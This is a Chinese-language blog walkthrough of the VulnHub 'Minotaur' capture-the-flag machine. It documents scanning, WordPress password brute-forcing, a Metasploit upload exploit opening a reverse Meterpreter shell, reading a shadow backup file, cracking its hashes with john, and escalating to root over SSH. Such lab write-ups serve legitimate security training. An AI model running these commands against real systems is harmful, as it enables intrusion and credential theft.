---
layout: config.default_layout
title: Vulnhub-SecTalks：BNE0x00 - Minotaur
date: 2025-04-02 15:36:41
updated: 2025-04-02 15:36:45
comments: true
tags: [Vulnhub]
categories: 靶机
---

# SecTalks：BNE0x00 - Minotaur

> https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,139/
> 

## 主机发现端口扫描

1. 使用nmap扫描网段类存活主机
    
    因为靶机是我最后添加的，所以靶机IP是`172`
    
    ```php
    nmap -sP 192.168.75.0/24
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 15:36 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00016s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00013s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.172
    Host is up (0.00014s latency).
    MAC Address: 00:0C:29:CA:6B:E4 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00019s latency).
    MAC Address: 00:50:56:EC:C5:A4 (VMware)
    Nmap scan report for 192.168.75.151
    Host is up.
    ```
    
2. 扫描主机开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.172
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 15:37 CST
    Nmap scan report for 192.168.75.172
    Host is up (0.00097s latency).
    Not shown: 65532 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    2020/tcp open  xinupageserver
    ```
    
3. 扫描主机服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p80,22,2020 192.168.75.172
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 15:38 CST
    Nmap scan report for 192.168.75.172
    Host is up (0.00037s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
    2020/tcp open  ftp     vsftpd 2.0.8 or later
    MAC Address: 00:0C:29:CA:6B:E4 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: Host: minotaur; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```python
     nmap -script=vuln -p 80,22,2020 192.168.75.172
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 15:38 CST
    Nmap scan report for 192.168.75.172
    Host is up (0.00048s latency).
    
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-slowloris-check:
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |
    |     Disclosure date: 2009-09-17
    |     References:
    |       http://ha.ckers.org/slowloris/
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    2020/tcp open  xinupageserver
    
    ```
    
    `2020`端口是`vsftp` 不过显示`xinupageserver` 不认识
    
    `2020` > `80` >`22`
    

## vsftp

1. 使用匿名帐户登录，啥也没有
    
    ```python
    ftp 192.168.75.172 2020
    Connected to 192.168.75.172.
    220 Welcome to minotaur FTP service.
    Name (192.168.75.172:root): anonymous
    331 Please specify the password.
    Password:
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> dir
    229 Entering Extended Passive Mode (|||60294|).
    150 Here comes the directory listing.
    226 Directory send OK.
    ftp>
    ```
    

## web渗透

1. 访问主页，是`apache`默认主页
2. 扫描目录，扫出个`/flag.txt`
    
    ```python
    dirsearch -u 192.168.75.172 -x 403
    [15:54:07] Starting:
    [15:54:35] 200 -   47B  - /flag.txt
    
    Task Completed
    ```
    
    访问得到`flagA`
    
    ```python
    # flag.txt
    Oh, lookey here. A flag!
    Th15 15 @N 3@5y f1@G!
    ```
    
    没头绪了，怀疑目录爆破不完全，换字典尝试
    
3. 尝试了几个字典终于找出了新目录 `bull`
    
    [https://github.com/TheKingOfDuck/fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts)
    
    字典连接，使用`fuzz/paramDict/dir.txt` 爆破出来的
    
4. 访问新目录
    
    ![image.png](image61.png)
    
    发现是`WordPress 4.2.2`
    
5. 直接使用`wpscan`
    
    ```python
    wpscan --url 192.168.75.172/bull/ -e u
    ```
    
    枚举出用户`bully` ，尝试爆破，尝试了常规字典爆破无法枚举出来，看靶机官网底下写着需要额外的字典，所以可能是让我们生成字典
    

## 生成字典

1. 使用`cewl`生成`cms`关键字字典，生成最短密码长度为`6`的密码字典
    
    ```python
    cewl http://192.168.75.172/bull -m 6 > wordlist.txt
    ```
    
2. 然后再使用`John`来生成更多密码组合
    
    ```python
    john --wordlist=wordlist.txt --rules --stdout > words-john.txt
    ```
    
3. 再尝试使用新生成的字典去爆破
    
    ```python
    wpscan --url 192.168.75.172/bull/ -U bully -P words-john.txt
    //
    [SUCCESS] - bully / Bighornedbulls
    ```
    
    枚举出密码`Bighornedbulls`
    

## 拿到shell

1. 我这里的`wpscan`扫不出任何漏洞（可能是我IP配置不正确的问题），查看了`WP`发现有个幻灯片插件存在漏洞，并且在`MSF`下有利用脚本
    
    ```python
    msf6 > use exploit/unix/webapp/wp_slideshowgallery_upload
    msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set rhosts 192.168.75.172
    rhosts => 192.168.75.172
    msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set targeturi /bull/
    targeturi => /bull/
    msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set WP_PASSWORD Bighornedbulls
    WP_PASSWORD => Bighornedbulls
    msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set WP_USER bully
    WP_USER => bully
    msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > run
    
    [*] Started reverse TCP handler on 192.168.75.151:4444
    [*] Trying to login as bully
    [*] Trying to upload payload
    [*] Uploading payload
    [*] Calling uploaded file klccanyg.php
    [*] Sending stage (39927 bytes) to 192.168.75.172
    [+] Deleted klccanyg.php
    [*] Meterpreter session 1 opened (192.168.75.151:4444 -> 192.168.75.172:36399) at 2024-10-30 18:07:17 +0800
    
    ```
    

## 提权

1. 查看权限
    
    ```python
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    $ whoami
    www-data
    $ uname -a
    Linux minotaur 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
    ```
    
2. 寻找敏感文件
    - `/tmp` 文件夹下存在`flag.txt`以及`shadow.bak`
        
        ```python
        # flag.txt
        That shadow.bak file is probably useful, hey?
        Also, you found a flag!
        My m1L|<$|-|@|<3 br1|\|G$ @11 t3h b0y$ 2 t3h y@R|)
        
        ```
        
        ```python
        # shadow.bak
        root:$6$15/OlfJP$h70tk3qikcf.kfwlGpYT7zfFg.cRzlJMlbVDSj3zCg4967ZXG0JzN/6oInrnvGf7AZaJFE2qJdBAOc/3AyeGX.:16569:0:99999:7:::
        daemon:*:16484:0:99999:7:::
        bin:*:16484:0:99999:7:::
        sys:*:16484:0:99999:7:::
        sync:*:16484:0:99999:7:::
        games:*:16484:0:99999:7:::
        man:*:16484:0:99999:7:::
        lp:*:16484:0:99999:7:::
        mail:*:16484:0:99999:7:::
        news:*:16484:0:99999:7:::
        uucp:*:16484:0:99999:7:::
        proxy:*:16484:0:99999:7:::
        www-data:*:16484:0:99999:7:::
        backup:*:16484:0:99999:7:::
        list:*:16484:0:99999:7:::
        irc:*:16484:0:99999:7:::
        gnats:*:16484:0:99999:7:::
        nobody:*:16484:0:99999:7:::
        libuuid:!:16484:0:99999:7:::
        syslog:*:16484:0:99999:7:::
        mysql:!:16569:0:99999:7:::
        messagebus:*:16569:0:99999:7:::
        landscape:*:16569:0:99999:7:::
        sshd:*:16569:0:99999:7:::
        minotaur:$6$3qaiXwrS$1Ctbj1UPpzKjWSgpIaUH0PovtO2Ar/IshWUe4tIUrJf8VlbIIijxdu4xHsXltA0mFavbo701X9.BG/fVIPD35.:16582:0:99999:7:::
        ftp:*:16573:0:99999:7:::
        heffer:$6$iH6pqgzM$3nJ00ToM38a.qLqcW8Yv0pdRiO/fXOvNv03rBzv./E0TO4B8y.QF/PNZ2JrghQTZomdVl3Zffb/MkWrFovWUi/:16582:0:99999:7:::
        h0rnbag:$6$nlapGOqY$Hp5VHWq388mVQemkiJA2U1qLI.rZAFzxCw7ivfyglRNgZ6mx68sE1futUy..m7dYJRQRUWEpm3XKihXPB9Akd1:16582:0:99999:7:::
        ```
        
3. 尝试爆破
    - 将泄露密码的几个账户保存为`users.txt`
        
        ```python
        john users.txt 
        //
        Using default input encoding: UTF-8
        Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
        Cost 1 (iteration count) is 5000 for all loaded hashes
        Will run 8 OpenMP threads
        Proceeding with single, rules:Single
        Press 'q' or Ctrl-C to abort, almost any other key for status
        Almost done: Processing the remaining buffered candidate passwords, if any.
        Proceeding with wordlist:/usr/share/john/password.lst
        Password1        (heffer)     
        obiwan6          (minotaur)     
        ```
        
        把两个用户的密码爆破出来了
        
    - 尝试用ssh登录
        
        ```python
        ssh minotaur@192.168.75.172
        minotaur@192.168.75.172's password:
        Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.16.0-30-generic i686)
        
         * Documentation:  https://help.ubuntu.com/
        
          System information as of Thu Oct 31 02:36:26 AEDT 2024
        
          System load: 0.72              Memory usage: 9%   Processes:       162
          Usage of /:  7.3% of 18.81GB   Swap usage:   0%   Users logged in: 0
        
          Graph this data and manage this system at:
            https://landscape.canonical.com/
        
        Last login: Wed May 27 16:55:30 2015
        minotaur@minotaur:~$ sudo -l
        Matching Defaults entries for minotaur on minotaur:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
        
        User minotaur may run the following commands on minotaur:
            (root) NOPASSWD: /root/bullquote.sh
            (ALL : ALL) ALL
        minotaur@minotaur:~$
        ```
        
        意外发现`minotaur`的权限和`root`相等
        
        ```python
        minotaur@minotaur:~$ sudo -i
        [sudo] password for minotaur:
        root@minotaur:~#
        ```
        
        读取`flag.txt`
        
        ```python
        
        root@minotaur:~# cat flag.txt
        Congrats! You got the final flag!
        Th3 Fl@g is: 5urr0nd3d bY @r$3h0l35
        ```
        
        ```python
        root@minotaur:~# cat quotes.txt
        And for me the only way to live life is to grab the bull but the horns and call up recording studios and set dates to go in recording studios. To try and accomplish somthing.
        If you can't dazzle them with brilliance, baffle them with bull.
        I admire bull riders for their passion and the uniqueness each one of them has.
        I am a huge bull on this country. We will not have a double-dip recession at all. I see our businesses coming back almost across the board.
        Not only the bull attacks his enemies with curved horn, but also the sheep, when harmed fights fights back.
        Sometimes I'm kind of spacey. I'm like Ferdinand the bull, sniffing the daisey, not aware of time, of what's going on in the world.
        There comes a time in the affairs of man when he must take the bull by the tail and face the situation.
        Bulls do not win full fights. People do.
        ```
        

## 总结

增强对字典生成能力，以及敏感目录的查找